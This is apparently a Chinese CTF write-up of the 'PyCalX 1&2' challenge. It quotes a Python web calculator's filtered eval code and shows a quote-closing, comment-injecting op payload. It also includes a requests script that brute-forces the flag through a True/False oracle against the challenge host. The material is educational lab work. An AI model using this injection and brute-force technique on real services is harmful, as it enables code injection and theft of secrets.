---
title: PyCalX 1&2
date: 2025-02-24 21:02:01
tags: 爆破
categories: 刷题笔记
---

## PyCalX 1&2

我们点击source查看代码

(放了关键代码)

```py
 def get_value(val):
        val = str(val)[:64]
        if str(val).isdigit(): return int(val)
        blacklist = ['(',')','[',']','\'','"'] # I don't like tuple, list and dict.
        if val == '' or [c for c in blacklist if c in val] != []:
            print('<center>Invalid value</center>')
            sys.exit(0)
        return val

    def get_op(val):
        val = str(val)[:2]
        list_ops = ['+','-','/','*','=','!']
        if val == '' or val[0] not in list_ops:
            print('<center>Invalid op</center>')
            sys.exit(0)
        return val

    op = get_op(arguments['op'].value)
    value1 = get_value(arguments['value1'].value)
    value2 = get_value(arguments['value2'].value)

    if str(value1).isdigit() ^ str(value2).isdigit():
        print('<center>Types of the values don\'t match</center>')
        sys.exit(0)

    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))

    print('<div class=container><div class=row><div class=col-md-2></div><div class="col-md-8"><pre>')
    print('>>>> print('+escape(calc_eval)+')')
```

我们发现对value1，op和value2的值进行了过滤

且op的第一个字母是`+-*/!`的一种，value和value2的值只能为数字

简单来说这个网页就是个计算器

执行代码为

```py
    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
    
    print('+escape(calc_eval)+')')

'''   
    '1'      +      '1'
	value1  op  vlaue2
''' 
```

由于op只判断了第一个值，我们可以在其后添加单引号，并注释后面的单引号

```
'1'                   +'      ' and source in FLAG#
value1            op       value2
```

我们可以看到op输入+’，成功闭合语句。然后再value2的地方构造语句。

这里的value由于and的存在限定了返回值只能为True/False，也就是1/0

然后我们爆破source就可以了

```py
import string

import requests
url="http://87bdc0c3-313e-4b71-b738-905d58ce6d15.node5.buuoj.cn:81/cgi-bin/pycalx.py?value1=test&op=%2B'&value2=and source in FLAG%23&source="
st=string.ascii_letters+string.digits+"{}_-"
flag="flag{"

for j in range(50):
    for i in st:
        r=requests.get(url+flag+i)
        print(url+flag+i)
        if "True" in r.text:
            flag+=i
            print(flag)

```

得到flag

![image-20250225163342684](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502251633823.png)
